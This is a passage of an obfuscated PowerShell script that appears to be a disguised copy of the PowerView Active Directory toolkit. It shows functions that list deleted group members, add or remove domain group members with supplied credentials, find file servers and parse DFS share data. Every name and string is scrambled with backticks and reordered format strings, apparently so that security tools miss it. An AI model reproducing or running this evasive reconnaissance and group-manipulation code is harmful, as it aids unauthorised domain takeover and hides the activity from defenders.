        if (${pSBoUN`DPAraMe`TE`Rs}[("{2}{0}{1}" -f'ch','Scope','Sear')]) { ${S`E`ArchERAr`gUMen`Ts}[("{1}{0}{3}{2}"-f'a','Se','ope','rchSc')] = ${sea`RChS`C`OpE} }
        if (${pS`BOU`NDpaRAMet`e`RS}[("{4}{2}{0}{1}{3}" -f 'P','ag','ult','eSize','Res')]) { ${seARChE`R`ARGUmE`NTS}[("{1}{3}{0}{2}" -f 'tPageSi','Res','ze','ul')] = ${re`SUltpA`G`eSi`Ze} }
        if (${p`s`BOuNDP`ARame`Ters}[("{0}{2}{4}{3}{1}"-f 'S','it','erve','meLim','rTi')]) { ${SeA`RChERa`R`Gu`mEnTS}[("{2}{0}{3}{1}" -f'e','TimeLimit','Serv','r')] = ${SerV`Ert`iM`eLImiT} }
        if (${p`SB`OUnDP`ARAmET`erS}[("{0}{2}{1}"-f 'Tombst','e','on')]) { ${searcHER`A`RgUmeN`Ts}[("{0}{2}{1}{3}"-f 'To','n','mbsto','e')] = ${tom`BsT`oNe} }
        if (${ps`BOunD`pAra`me`TE`RS}[("{1}{0}{2}{3}" -f'ede','Cr','n','tial')]) { ${Se`ArCHE`RaRG`UmENTS}[("{1}{2}{0}" -f'l','Credent','ia')] = ${c`RED`EnTi`AL} }
    }

    PROCESS {
        if (${PSBo`U`ND`ParA`MeTERs}[("{1}{0}"-f'ity','Ident')]) { ${sEarCHE`R`ARgu`m`En`TS}[("{2}{1}{0}" -f'ty','denti','I')] = ${iDe`NT`I`Ty} }

        &("{3}{4}{0}{1}{2}"-f'e','c','t','Get','-DomainObj') @SearcherArguments | &("{1}{2}{0}"-f'ject','ForEac','h-Ob') {
            ${ob`jec`TDN} = ${_}."pR`o`pErT`IeS"[("{0}{1}{2}{4}{3}" -f'dis','ting','uish','e','ednam')][0]
            ForEach(${XM`lnOdE} in ${_}."PROp`ERT`ies"[("{3}{0}{5}{4}{1}{2}{6}"-f 's-','eme','t','msd','plvalu','re','adata')]) {
                ${te`m`pO`BjEcT} = [xml]${xM`LN`ode} | &("{1}{0}{2}" -f'elect-O','S','bject') -ExpandProperty ("{3}{1}{5}{0}{4}{2}"-f'META_','L','TA','DS_REPL_VA','DA','UE_') -ErrorAction ("{2}{3}{0}{1}" -f 'ti','nue','Silently','Con')
                if (${tE`M`pOBje`ct}) {
                    if ((${te`m`POBjEcT}."p`SZattrI`ButE`N`AME" -Match ("{0}{1}"-f 'mem','ber')) -and ((${te`M`poBj`ect}."dw`V`eRSIOn" % 2) -eq 0 )) {
                        ${OUt`Put} = &("{2}{0}{1}"-f'b','ject','New-O') ("{0}{2}{1}"-f'PS','bject','O')
                        ${oUt`p`Ut} | &("{1}{0}{2}" -f'Me','Add-','mber') ("{0}{2}{1}" -f'Not','ty','eProper') ("{0}{1}{2}"-f'Gro','up','DN') ${OBj`ecT`dn}
                        ${ou`TPut} | &("{2}{1}{0}" -f'er','Memb','Add-') ("{2}{0}{1}" -f 'tePr','operty','No') ("{0}{1}{2}" -f 'Memb','erD','N') ${Te`m`Po`BjECT}."P`SZob`j`ECTDn"
                        ${O`U`Tput} | &("{0}{2}{1}"-f'Add-Me','r','mbe') ("{2}{1}{0}{3}"-f'er','oteProp','N','ty') ("{1}{3}{2}{0}{4}"-f'rst','T','meFi','i','Added') ${t`e`Mpob`JecT}."fT`ImECrEA`T`ed"
                        ${o`UT`pUT} | &("{1}{0}{2}"-f 'dd-Memb','A','er') ("{1}{0}{2}" -f 'o','NotePr','perty') ("{2}{0}{1}"-f'elet','ed','TimeD') ${t`EmPOb`je`cT}."ftIMEDE`l`e`TEd"
                        ${ou`Tp`UT} | &("{0}{1}{2}"-f'Add-','Me','mber') ("{2}{1}{0}"-f 'y','pert','NotePro') ("{1}{0}{3}{2}"-f'tOrigi','Las','ingChange','nat') ${te`mpo`BJ`ECt}."FtI`Melas`TOrig`iN`AT`inGChan`ge"
                        ${o`UtPut} | &("{1}{2}{0}" -f '-Member','A','dd') ("{0}{1}{2}"-f 'NoteP','ropert','y') ("{0}{1}{2}" -f 'T','i','mesAdded') (${tE`mpob`jE`ct}."DW`VeRSI`ON" / 2)
                        ${ou`Tp`UT} | &("{1}{2}{0}"-f 'ber','Add-M','em') ("{0}{2}{1}" -f'N','Property','ote') ("{0}{3}{2}{1}" -f'LastO','tingDsaDN','ina','rig') ${Te`mp`oBj`EcT}."PszLAst`ORIgIn`A`T`INgD`SAdn"
                        ${ou`TPUT}."PSO`BJECT"."tyPEN`Am`es".("{1}{0}"-f't','Inser').Invoke(0, ("{6}{5}{8}{1}{3}{9}{4}{2}{7}{0}" -f 'eted','i','pMembe','ew.D','Grou','er','Pow','rDel','V','omain'))
                        ${ouTP`Ut}
                    }
                }
                else {
                    &("{1}{0}{2}{3}"-f '-','Write','Ver','bose') ('[Get-Do'+'ma'+'in'+'G'+'roup'+'MemberDe'+'leted]'+' '+'E'+'rr'+'or '+'ret'+'rieving'+' '+('{0}'+'m'+'s'+'ds-replv'+'alu'+'emetadat'+'a{0}'+' ')-f  [ChAr]39+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function AdD`-doMaIn`g`RouPM`emb`er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{4}{0}{3}"-f'ldP','P','SS','rocess','hou'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitIOn = 0, MANdatoRy = ${T`RuE})]
        [Alias({"{0}{1}{2}" -f 'G','rou','pName'}, {"{1}{0}{2}" -f'ro','G','upIdentity'})]
        [String]
        ${iD`E`NTITy},

        [Parameter(MAndATOrY = ${T`RuE}, VaLuEfROMPIPeLInE = ${T`RUE}, vAlUeFRompiPELInebYpRoPErTyname = ${tR`Ue})]
        [Alias({"{4}{0}{2}{3}{1}"-f'mb','y','erIde','ntit','Me'}, {"{0}{2}{1}" -f'Me','ber','m'}, {"{0}{1}{2}{3}" -f 'Dis','ti','nguishedNam','e'})]
        [String[]]
        ${mem`BE`Rs},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`Ain},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EdeNT`iAl} =  $0DSqR::"EMP`Ty"
    )

    BEGIN {
        ${C`oNTExTAr`Gum`eN`Ts} = @{
            ("{0}{1}" -f'Ide','ntity') = ${ideNTi`Ty}
        }
        if (${p`sBo`UNDp`ArameterS}[("{0}{1}"-f 'Doma','in')]) { ${cON`Tex`Ta`RgU`mEN`Ts}[("{1}{0}"-f 'main','Do')] = ${D`OM`AIn} }
        if (${ps`BO`UndpAR`AMETe`RS}[("{0}{2}{1}" -f 'Cre','l','dentia')]) { ${C`ontExt`Arg`UM`entS}[("{2}{3}{0}{1}"-f'de','ntial','C','re')] = ${CREDeN`TI`AL} }

        ${gr`ou`Pc`OnTEXT} = &("{4}{3}{1}{0}{2}"-f'Co','-Principal','ntext','et','G') @ContextArguments

        if (${G`R`oUpcOn`T`Ext}) {
            try {
                ${Gr`O`Up} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{1}{2}{3}{0}" -f'ntity','F','indBy','Ide').Invoke(${GrOU`Pc`OnTeXT}."cONte`XT", ${GROUp`Co`N`TExT}."id`ENtI`TY")
            }
            catch {
                &("{1}{2}{0}{3}"-f'rni','Wri','te-Wa','ng') ('[Ad'+'d-'+'Domai'+'nGro'+'upMe'+'mber'+'] '+'Error'+' '+'fi'+'nding'+' '+'t'+'he '+'gr'+'ou'+'p '+'i'+'dentity'+' '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${Gr`ouP}) {
            ForEach (${mEM`B`eR} in ${ME`mbe`Rs}) {
                if (${MeM`B`ER} -match ((("{2}{1}{0}" -f '+','LvR.','.+LvR'))."R`EPlACe"(([cHaR]76+[cHaR]118+[cHaR]82),'\'))) {
                    ${cOntexT`A`RgUm`E`Nts}[("{2}{1}{0}" -f'ity','dent','I')] = ${meM`BER}
                    ${usE`Rc`OnTe`Xt} = &("{2}{3}{0}{1}" -f'nte','xt','Get-','PrincipalCo') @ContextArguments
                    if (${u`Se`Rc`OnTEXt}) {
                        ${us`Eriden`TITy} = ${us`ER`cONTexT}."iD`ENti`Ty"
                    }
                }
                else {
                    ${Us`E`RcON`TeXT} = ${grO`UpcO`NTE`xt}
                    ${usE`RiDen`TITy} = ${mE`mber}
                }
                &("{0}{1}{2}" -f'Wr','ite-Ve','rbose') ('['+'Add-Domain'+'Gr'+'o'+'u'+'pMe'+'mber] '+'Addi'+'ng '+'memb'+'er '+"'$Member' "+'to'+' '+'grou'+'p'+' '+"'$Identity'")
                ${meM`B`eR} = [System.DirectoryServices.AccountManagement.Principal]::("{0}{3}{2}{1}" -f'Find','tity','Iden','By').Invoke(${Us`erCONte`XT}."co`NT`EXt", ${uSERIdE`N`Ti`TY})
                ${Gr`OuP}."ME`Mb`eRS".("{0}{1}" -f'Ad','d').Invoke(${MEM`BeR})
                ${Gro`UP}.("{1}{0}"-f'e','Sav').Invoke()
            }
        }
    }
}


function R`E`mOVe-dO`mA`I`NGRoUPME`MbEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f'Shou','PS','s','ldProces'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITIOn = 0, MandAtory = ${TR`UE})]
        [Alias({"{1}{0}"-f 'me','GroupNa'}, {"{0}{2}{1}{3}" -f'Gr','pIdent','ou','ity'})]
        [String]
        ${ID`E`NTItY},

        [Parameter(MAnDatoRy = ${T`Rue}, vAluEFroMpiPeLINE = ${T`RuE}, vaLueFrOMPIPelINebYprOpErTynAmE = ${t`RuE})]
        [Alias({"{0}{1}{2}{3}"-f 'Me','mberId','entit','y'}, {"{1}{2}{0}" -f'mber','M','e'}, {"{1}{0}{3}{2}" -f 'isting','D','me','uishedNa'})]
        [String[]]
        ${MEMB`e`RS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`M`Ain},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEd`eNti`AL} =   (gEt-VaRiabLE  0DSqr  -va )::"EmP`Ty"
    )

    BEGIN {
        ${contEXta`R`gu`m`EnTs} = @{
            ("{0}{1}{2}"-f'Id','e','ntity') = ${IDE`NT`iTy}
        }
        if (${p`SBOu`NDP`ArAMet`eRS}[("{2}{1}{0}" -f'in','a','Dom')]) { ${cOn`TeX`T`Arg`UmEN`Ts}[("{1}{0}" -f 'main','Do')] = ${dOM`A`In} }
        if (${PS`BOU`NDParaMeT`erS}[("{0}{1}{2}"-f'C','reden','tial')]) { ${coN`Te`xTar`gU`mENts}[("{1}{2}{0}"-f 'ntial','C','rede')] = ${Cred`en`Tial} }

        ${grOuPC`OnTe`xT} = &("{4}{1}{2}{3}{0}"-f 'xt','ci','palC','onte','Get-Prin') @ContextArguments

        if (${Gr`ou`pCO`Nt`ExT}) {
            try {
                ${gR`OUp} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{0}{1}{2}" -f'F','indByIden','tity').Invoke(${GrO`U`PC`ontext}."c`ontEXT", ${G`R`oupCon`T`exT}."id`e`NtitY")
            }
            catch {
                &("{2}{0}{3}{1}"-f 'r','g','W','ite-Warnin') ('[Remove-'+'Do'+'mainG'+'ro'+'upMe'+'mb'+'er] '+'Er'+'ror '+'f'+'inding '+'th'+'e '+'group'+' '+'iden'+'t'+'i'+'ty '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${Gr`oUP}) {
            ForEach (${M`E`mBER} in ${memBE`RS}) {
                if (${MEM`BeR} -match ((("{2}{0}{1}"-f'6lQ','.+','.+6lQ'))."REp`L`Ace"(([CHAR]54+[CHAR]108+[CHAR]81),[stRing][CHAR]92))) {
                    ${cONTEXT`ARGum`e`NTs}[("{1}{2}{0}"-f 'tity','I','den')] = ${M`EmbER}
                    ${u`SER`CO`NTexT} = &("{4}{5}{1}{2}{3}{6}{0}" -f 't','inc','ipal','Co','G','et-Pr','ntex') @ContextArguments
                    if (${U`SERcoNt`exT}) {
                        ${uSe`RId`E`N`TItY} = ${u`Ser`con`TEXt}."idEn`T`Ity"
                    }
                }
                else {
                    ${u`Se`RCo`NtEXt} = ${g`ROUpC`on`TE`Xt}
                    ${u`Se`RI`dEntIty} = ${Mem`B`eR}
                }
                &("{1}{2}{3}{0}"-f'bose','Write-V','e','r') ('[Remove-'+'D'+'omainG'+'roupMembe'+'r] '+'R'+'emoving'+' '+'memb'+'e'+'r '+"'$Member' "+'from'+' '+'gr'+'ou'+'p '+"'$Identity'")
                ${mEm`B`Er} = [System.DirectoryServices.AccountManagement.Principal]::("{0}{2}{3}{4}{1}"-f 'Find','ity','B','y','Ident').Invoke(${uSer`c`OnT`EXt}."co`NTEXT", ${Userid`e`NTi`TY})
                ${gR`o`Up}."Me`MBE`Rs".("{0}{1}"-f 'Remov','e').Invoke(${M`eMbeR})
                ${g`ROup}.("{0}{1}" -f'Sa','ve').Invoke()
            }
        }
    }
}


function Get-D`oMA`inf`ilEs`e`R`VeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}" -f'ldProcess','Sh','ou','PS'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( valUeFroMPIpelInE = ${T`RUe}, vALuefRompIPelIneByprOpErTynamE = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'Domai','n','Name'}, {"{1}{0}" -f'e','Nam'})]
        [String[]]
        ${dOm`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'e','r','Filt'})]
        [String]
        ${L`DApFiLt`eR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'ADS','Path'})]
        [String]
        ${seaR`cHbA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{3}{2}" -f'DomainCo','n','roller','t'})]
        [String]
        ${s`ErV`ER},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{2}{0}{1}" -f'v','el','OneLe'}, {"{2}{0}{1}"-f'tr','ee','Sub'})]
        [String]
        ${s`EArcHSc`OpE} = ("{2}{1}{0}"-f 'tree','ub','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`s`U`LtpaGESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVERtI`m`el`iMiT},

        [Switch]
        ${T`oM`B`stONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`dENt`iAl} =   $0DsQR::"Emp`Ty"
    )

    BEGIN {
        function SPLit`-P`ATh {
            
            Param([String]${PA`Th})

            if (${P`Ath} -and (${P`Ath}.("{1}{0}" -f 'plit','s').Invoke('\\')."coU`Nt" -ge 3)) {
                ${Te`MP} = ${p`AtH}.("{1}{0}" -f'plit','s').Invoke('\\')[2]
                if (${t`emP} -and (${tE`mP} -ne '')) {
                    ${te`MP}
                }
            }
        }

        ${SE`A`RC`heRaR`gUmeNts} = @{
            ("{2}{0}{1}" -f'DAPFilte','r','L') = ((("{6}{35}{25}{0}{34}{33}{38}{9}{36}{15}{28}{22}{29}{24}{18}{14}{11}{8}{23}{31}{1}{4}{20}{13}{12}{2}{26}{19}{37}{5}{17}{10}{30}{7}{3}{21}{32}{16}{27}"-f 'untType=','1.4.','=','h=*)(profile','8','irect','(&(sam','ptpat','1','8)(!(use',')(','40.',':','3','8','nt','*))','ory=*','.2.','me','0','path','ontr','13',':1','o','2))({0}(ho',')','C','ol','scri','556.','=','530','80','Acc','rAccou','d','636'))  -F[chaR]124)
            ("{0}{1}{2}{3}" -f'Proper','t','i','es') = ("{7}{8}{1}{6}{9}{2}{4}{10}{3}{0}{5}"-f'prof','irecto','t','th,','p','ilepath','ry,','h','omed','scrip','a')
        }
        if (${p`S`BOuNd`P`ArAMe`TeRS}[("{2}{1}{0}" -f'e','rchBas','Sea')]) { ${sea`RchE`Ra`Rg`UMeNTS}[("{2}{0}{1}" -f'h','Base','Searc')] = ${SE`ArCh`B`AsE} }
        if (${PsBoUn`dP`AR`AmetERs}[("{1}{2}{0}"-f'er','Ser','v')]) { ${SeARC`he`R`ARgUME`N`TS}[("{1}{0}"-f 'r','Serve')] = ${sErV`er} }
        if (${P`SbO`Und`pArAMeTErs}[("{2}{1}{0}" -f 'ope','Sc','Search')]) { ${SeaRcHEraR`GUM`e`N`Ts}[("{3}{1}{2}{0}"-f 'ope','r','chSc','Sea')] = ${Se`ArchS`CoPe} }
        if (${pSBoUn`d`PaRAMe`TERs}[("{4}{0}{2}{1}{3}"-f'su','PageSiz','lt','e','Re')]) { ${s`eArCh`ER`Argu`meNTs}[("{2}{4}{3}{1}{0}" -f'e','Siz','Res','Page','ult')] = ${REsuL`T`P`A`GESiZe} }
        if (${P`sBO`UNd`pa`R`AmEteRs}[("{2}{1}{0}"-f 't','verTimeLimi','Ser')]) { ${S`ea`RcHeRAr`GU`menTs}[("{0}{1}{2}{3}" -f'Serv','e','rTimeLi','mit')] = ${se`RvERtIMeli`M`It} }
        if (${Ps`BOuND`pA`RAMeTERS}[("{1}{0}"-f'bstone','Tom')]) { ${sea`Rch`eR`ARgUmen`Ts}[("{2}{0}{1}" -f 'mbst','one','To')] = ${To`MbsTO`Ne} }
        if (${psBo`UnD`PARAme`TERS}[("{2}{1}{3}{0}" -f 'ial','rede','C','nt')]) { ${seAR`c`he`Ra`RgU`MENTS}[("{3}{0}{2}{1}"-f 'rede','al','nti','C')] = ${CRede`NT`IaL} }
    }

    PROCESS {
        if (${pSb`o`U`N`Dpar`AmEtERS}[("{1}{0}" -f 'in','Doma')]) {
            ForEach (${targ`eTD`oMaIn} in ${Doma`In}) {
                ${SE`Ar`cHeRArgU`ME`N`TS}[("{1}{0}" -f'ain','Dom')] = ${tA`Rge`T`D`OmAin}
                ${USE`RseA`R`cheR} = &("{3}{2}{1}{0}{4}" -f 'h','ainSearc','t-Dom','Ge','er') @SearcherArguments
                
                $(ForEach(${uSErre`su`lT} in ${UseRSe`ArC`heR}.("{1}{0}"-f 'ndAll','Fi').Invoke()) {if (${uS`ErR`e`suLT}."p`R`oPERtiEs"[("{1}{3}{0}{2}" -f 'ecto','homedi','ry','r')]) {&("{2}{1}{0}"-f'lit-Path','p','S')(${U`s`ERRe`SulT}."pRoP`eRTI`eS"[("{4}{2}{1}{3}{0}"-f 'y','re','edi','ctor','hom')])}if (${U`Serr`ES`Ult}."ProPErt`I`eS"[("{0}{2}{1}" -f'scrip','ath','tp')]) {&("{2}{0}{1}"-f 'lit-Pa','th','Sp')(${USE`RRe`S`UlT}."P`RopER`Ties"[("{0}{1}{2}" -f'scri','p','tpath')])}if (${us`E`Rr`esulT}."PR`OpeRt`iEs"[("{1}{2}{0}" -f'filepath','pr','o')]) {&("{3}{0}{1}{2}" -f 't-','Pa','th','Spli')(${Us`E`RR`EsULT}."P`Ro`PertIEs"[("{1}{2}{0}" -f 'ilepath','pro','f')])}}) | &("{2}{1}{3}{0}" -f 'ct','o','S','rt-Obje') -Unique
            }
        }
        else {
            ${u`S`erSE`ArCHER} = &("{3}{0}{2}{1}" -f'DomainSearch','r','e','Get-') @SearcherArguments
            $(ForEach(${US`eRR`es`Ult} in ${usERS`E`ArcHeR}.("{0}{1}" -f 'FindAl','l').Invoke()) {if (${uS`ERrEs`ULt}."PR`oPe`Rties"[("{2}{0}{1}{4}{3}"-f'me','dire','ho','tory','c')]) {&("{0}{1}{2}"-f 'Split-','Pa','th')(${u`SER`ReSUlt}."p`Rop`Er`TIes"[("{0}{2}{1}"-f'homedire','ry','cto')])}if (${uS`e`R`REsUlT}."PROPE`R`TIES"[("{1}{0}{2}"-f'riptpa','sc','th')]) {&("{2}{1}{0}"-f'it-Path','l','Sp')(${USErre`Su`lT}."P`R`OPER`TIeS"[("{3}{2}{1}{0}" -f'h','at','ptp','scri')])}if (${Us`e`RrESu`LT}."pRO`PERti`Es"[("{1}{0}{2}" -f 'of','pr','ilepath')]) {&("{0}{1}{2}"-f'Split','-P','ath')(${U`s`Err`eSULT}."PROp`Er`TieS"[("{1}{0}{2}"-f'l','profi','epath')])}}) | &("{1}{2}{3}{0}"-f 'Object','Sor','t','-') -Unique
        }
    }
}


function G`ET`-doMAindf`sShARE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}{4}" -f'roc','PSSho','ldP','u','ess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{6}{5}{3}{1}{2}{0}{4}" -f 'ign','VarsMoreThan','Ass','red','ments','cla','seDe','PSU'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{0}{1}{3}{4}{2}" -f 'S','Use','erbs','A','pprovedV','P'}, '')]
    [OutputType({"{2}{9}{6}{7}{8}{10}{5}{4}{3}{0}{1}"-f'omObjec','t','Sys','on.PSCust','ti','utoma','em.Manag','emen','t','t','.A'})]
    [CmdletBinding()]
    Param(
        [Parameter( VALuefrOmPiPeLiNE = ${tR`Ue}, vaLUEfrompIPELInEBYpROpERTYnaME = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'D','omainNam','e'}, {"{0}{1}" -f'Na','me'})]
        [String[]]
        ${D`OMa`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'SPat','AD','h'})]
        [String]
        ${SEA`Rc`Hba`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}"-f'ller','ntro','Dom','ainCo'})]
        [String]
        ${S`eRV`ER},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{1}{0}{2}"-f'eLeve','On','l'}, {"{1}{0}" -f 'e','Subtre'})]
        [String]
        ${seA`Rchsc`OPE} = ("{1}{0}" -f'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSuL`TP`AGEsi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVER`T`I`MeLI`Mit},

        [Switch]
        ${tO`Mb`STOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`denTI`Al} =   $0dSqR::"E`mPTy",

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${ve`RS`IOn} = 'All'
    )

    BEGIN {
        ${s`e`ArcHE`Rarg`UmENTs} = @{}
        if (${PsbO`U`N`d`PARAmEtE`Rs}[("{2}{0}{1}"-f 'Bas','e','Search')]) { ${sE`A`RC`HEraRgumEnTs}[("{0}{1}{2}"-f'Sear','chB','ase')] = ${SEaR`ChB`Ase} }
        if (${Psb`OUndpaRAMet`e`RS}[("{2}{0}{1}"-f 'erve','r','S')]) { ${sEar`che`Rarg`Ume`NTs}[("{0}{1}{2}" -f 'S','erv','er')] = ${sE`Rv`eR} }
        if (${psbo`UnD`pa`RA`MEteRs}[("{2}{0}{3}{1}"-f'earch','e','S','Scop')]) { ${SE`Ar`cheRAR`Gu`m`enTs}[("{2}{0}{1}"-f'ar','chScope','Se')] = ${s`EArCHs`CO`Pe} }
        if (${PSBouND`PARa`MeT`E`Rs}[("{0}{2}{1}{3}" -f 'R','lt','esu','PageSize')]) { ${S`eAR`cherA`R`GumenTs}[("{2}{0}{1}{3}" -f 'ul','t','Res','PageSize')] = ${r`ES`ULtPaGesIZe} }
        if (${p`sB`oUnDPaRAm`EtErS}[("{4}{1}{0}{3}{2}" -f'TimeL','er','t','imi','Serv')]) { ${SE`ArcheRaR`g`UM`EnTS}[("{1}{2}{3}{0}"-f 't','ServerT','ime','Limi')] = ${s`er`VertIME`lim`iT} }
        if (${psbO`Un`d`parAmET`ERS}[("{2}{1}{0}"-f'e','on','Tombst')]) { ${sEaRc`HerARG`U`mentS}[("{0}{3}{2}{1}"-f'Tomb','e','n','sto')] = ${t`o`M`BStONe} }
        if (${pSbo`UnDpA`R`AM`eteRS}[("{2}{1}{0}"-f 'tial','n','Crede')]) { ${SEarC`h`e`RArgUmENts}[("{3}{2}{1}{0}" -f 'l','a','i','Credent')] = ${C`Re`dEnTi`AL} }

        function P`A`R`se-pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${P`kT}
            )

            ${B`IN} = ${p`kt}
            ${bl`oB_`VERsI`on} =   $Sqpy8::"tOu`iNt32"(${B`In}[0..3],0)
            ${bLo`B_eLe`meN`T`_counT} =   (  GeT-ITEM vARIAbLe:sQpY8 ).valUE::"TouIn`T`32"(${b`iN}[4..7],0)
            ${of`F`Set} = 8
            
            ${OBjE`c`T_li`St} = @()
            for(${I}=1; ${I} -le ${bLoB_`eLEMEnt`_C`OUNT}; ${i}++){
                ${B`LOB_`NaMe_`s`iz`e_stArT} = ${off`SET}
                ${B`lOB_`N`AM`e_`sIze_eNd} = ${of`F`SeT} + 1
                ${bloB_nAMe`_S`I`zE} =   $SQpy8::"TOuIn`T`16"(${B`iN}[${Blob`_NAME`_Size_S`Ta`Rt}..${bloB_`NamE_`s`izE_enD}],0)

                ${BLob_NA`Me`_S`T`Art} = ${bLOB_na`mE`_S`iZ`e_E`Nd} + 1
                ${BlO`B_`N`A`me_eNd} = ${BLOb`_N`A`me`_STaRt} + ${BLOB`_NAM`e_`sIze} - 1
                ${bLo`B_n`Ame} =  $Ie9q::"U`NicO`de"."gEt`s`TriNg"(${B`iN}[${bL`o`B_`NAmE_`sTaRt}..${BlOb_NAme`_E`ND}])

                ${B`LOB_DAT`A_Si`ZE_sTARt} = ${BlOB_NA`me_E`ND} + 1
                ${BlO`B_D`ATA_s`IZE_End} = ${BlO`B_data_siz`e_`s`Tart} + 3
                ${b`LO`B_DaTa_`S`IzE} =  ( gET-varIABle ('sq'+'PY8') -valUeo )::"TO`UIN`T32"(${B`IN}[${b`L`OB`_`Da`Ta_sizE_`sTaRt}..${BL`oB`_DAt`A`_S`Ize_eND}],0)

                ${b`lOB_DAT`A_s`T`ART} = ${B`LOb_`D`A`TA_sizE`_end} + 1
                ${b`l`Ob`_DAtA_e`ND} = ${b`loB_d`AT`A_staRT} + ${B`lob_daTA`_sI`ze} - 1
                ${BL`Ob`_Da`TA} = ${B`In}[${Bl`Ob`_`d`Ata_sTARt}..${b`LoB`_da`Ta_`enD}]
                switch -wildcard (${bL`oB_`NaMe}) {
                    ((("{0}{2}{1}"-f'{','ot','0}sitero'))  -F[cHar]92) {  }
                    ((("{3}{1}{0}{2}"-f 'mainro','SMdo','ot*','b')) -rEplaCE([CHAr]98+[CHAr]83+[CHAr]77),[CHAr]92) {
                        
                        
                        ${roO`T_OR_L`In`K_gui`d`_`stArt} = 0
                        ${Ro`O`T_oR`_LiNK_gUiD_`end} = 15
                        ${RoO`T_Or`_linK`_Gu`id} = [byte[]]${bLO`B_`DATa}[${rooT_Or_`L`i`NK_G`UiD_st`ArT}..${ROOt_oR`_`lIn`k_`gUiD`_E`ND}]
                        ${G`UiD} = &("{1}{2}{0}"-f 't','New-Ob','jec') ("{1}{0}" -f 'id','Gu')(,${rOo`T_or`_L`iN`K_guiD}) 
                        ${P`R`EFIx_sI`z`e_`sTart} = ${rOoT_`oR_lIN`k_guiD_`ENd} + 1
                        ${p`Ref`I`x`_Size_End} = ${pREfIX_S`iz`e_S`TArT} + 1
                        ${pREFI`X`_S`IZe} =  ( Ls  vAriABle:sQpY8  ).ValuE::"ToU`IN`T16"(${B`L`Ob_DAta}[${pref`IX_s`IzE_ST`ART}..${PREFi`x`_`sizE_`E`ND}],0)
                        ${PREFix_St`A`RT} = ${PRe`Fi`X_si`ze_`End} + 1
                        ${P`REfI`x_e`Nd} = ${p`RE`FI`x_STARt} + ${prEfIx`_s`IZE} - 1
                        ${P`REfIx} =  ( gEt-cHiLdITem  VARIabLE:IE9q  ).VALUE::"uN`icoDe"."geTS`T`RiNg"(${bL`o`B_D`AtA}[${Pr`e`Fix_`stArt}..${pr`eFix_e`ND}])

                        ${sH`OrT_`p`RE`Fix_SiZe_staRt} = ${PReFI`x_e`ND} + 1
                        ${sHORt_PREf`iX`_siZE`_End} = ${S`HOrt`_`pr`EFIx_si`Ze`_ST`ART} + 1
                        ${S`horT_PRE`Fix_s`ize} =   ( gEt-vARIaBLe  ("sQPy"+"8") -val )::"TouI`NT16"(${bLO`B`_dA`TA}[${SH`ORT_Pr`EfiX_S`IZ`E_STArt}..${S`hoR`T_`pREfIX`_`sIzE_e`ND}],0)
                        ${S`Ho`Rt_`PREFI`x_stArT} = ${sh`Ort_`preFiX`_`s`IZE_`END} + 1
                        ${S`HO`RT`_Pre`FiX_`ENd} = ${s`HORt`_PR`eFiX_STArt} + ${SH`o`Rt_PRe`F`Ix`_size} - 1
                        ${Sho`R`T_Pr`E`FIx} =   (  gCI ('Va'+'Ria'+'blE'+':iE9Q')).VALuE::"U`N`iCode"."ge`T`strI`Ng"(${BLOb`_Da`Ta}[${S`Ho`Rt_prefiX_`stArt}..${Sh`ORT_PrE`F`ix_eND}])

                        ${TYp`e_stA`RT} = ${ShO`RT_`Pr`efix`_enD} + 1
                        ${ty`Pe`_EnD} = ${TYPe`_StA`Rt} + 3
                        ${t`yPe} =  (Ls VarIaBlE:SQPY8  ).ValuE::"TOU`int`32"(${B`Lob_`DATA}[${t`yPE_sTa`Rt}..${TYp`e_`enD}],0)

                        ${STAt`E_`STart} = ${t`Yp`e_end} + 1
                        ${s`TAtE`_`end} = ${sTa`T`E_st`ArT} + 3
                        ${S`TATE} =  ( gi  ("va"+"RiabL"+"e"+":sqpy8") ).vALuE::"t`ouiN`T32"(${bLO`B_D`ATA}[${StAt`e_`STA`RT}..${sT`AtE_`End}],0)

                        ${cOm`MeNT`_SI`Ze`_sTaRT} = ${S`T`A`Te_eND} + 1
